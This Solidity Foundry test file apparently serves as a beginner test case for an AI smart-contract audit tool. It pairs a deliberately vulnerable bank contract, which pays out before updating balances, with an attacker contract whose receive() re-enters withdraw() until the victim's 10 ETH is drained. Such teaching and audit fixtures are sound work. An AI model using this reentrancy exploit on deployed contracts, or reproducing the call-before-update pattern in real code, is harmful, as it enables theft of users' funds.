// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyPoC (Standalone)
 * @notice Standalone Foundry PoC test — includes inline VulnerableBank contract for self-contained testing
 * @difficulty Beginner
 * @vuln_types Reentrancy
 * @expected_findings testReentrancyDrainsBank() proves exploit; bank balance drops to 0 after attack
 * @audit_command claude "audit contracts/test-cases/Reentrancy.sol"
 */

import "forge-std/Test.sol";

/// @title VulnerableBank - Target contract with reentrancy vulnerability
contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // BUG: External call before state update
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/// @title Attacker - Exploits reentrancy in VulnerableBank
contract Attacker {
    VulnerableBank public bank;
    uint256 public constant DEPOSIT_AMOUNT = 1 ether;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    /// @notice Launch the reentrancy attack
    function attack() external payable {
        require(msg.value >= DEPOSIT_AMOUNT, "Need at least 1 ETH");
        // Step 1: Deposit into the vulnerable bank
        bank.deposit{value: DEPOSIT_AMOUNT}();
        // Step 2: Trigger withdraw, which will re-enter via receive()
        bank.withdraw();
    }

    /// @dev Fallback triggers during the ETH transfer from bank.withdraw()
    ///      Re-enters withdraw() before balances[msg.sender] is set to 0
    receive() external payable {
        // Re-enter while our balance in the bank is still > 0
        if (address(bank).balance >= DEPOSIT_AMOUNT) {
            bank.withdraw();
        }
    }
}

/// @title ReentrancyPoC - Foundry test proving the reentrancy exploit
contract ReentrancyPoC is Test {
    VulnerableBank bank;
    Attacker attacker;

    address victim = makeAddr("victim");
    address hacker = makeAddr("hacker");

    uint256 constant VICTIM_DEPOSIT = 10 ether;
    uint256 constant ATTACK_FUND    = 1 ether;

    function setUp() public {
        // Deploy the vulnerable bank
        bank = new VulnerableBank();

        // Victim deposits 10 ETH (the target funds)
        vm.deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        bank.deposit{value: VICTIM_DEPOSIT}();

        // Deploy attacker contract funded with 1 ETH
        vm.deal(hacker, ATTACK_FUND);
        vm.prank(hacker);
        attacker = new Attacker(address(bank));
    }

    /// @notice Demonstrates the reentrancy attack: attacker drains the bank
    function test_reentrancy_drains_bank() public {
        uint256 bankBefore = address(bank).balance;
        uint256 attackerBefore = address(attacker).balance;

        assertEq(bankBefore, VICTIM_DEPOSIT, "Bank should hold 10 ETH before attack");

        // Launch attack (deposit 1 ETH then re-enter withdraw repeatedly)
        vm.prank(hacker);
        attacker.attack{value: ATTACK_FUND}();

        uint256 bankAfter = address(bank).balance;
        uint256 attackerAfter = address(attacker).balance;

        // --- Proof of exploitation ---
        // Bank is drained: balance drops from 10 ETH → 0
        assertEq(bankAfter, 0, "Bank should be fully drained after attack");
        // Attacker gains: 1 ETH in → 11 ETH out (10 stolen + 1 returned)
        assertGt(attackerAfter, attackerBefore, "Attacker should profit from reentrancy");
        assertEq(attackerAfter, VICTIM_DEPOSIT + ATTACK_FUND, "Attacker should hold 11 ETH");
        // Victim's recorded balance is still 10 ETH but funds are gone
        assertEq(bank.balances(victim), VICTIM_DEPOSIT, "Victim balance entry still exists (ghost balance)");
    }


}
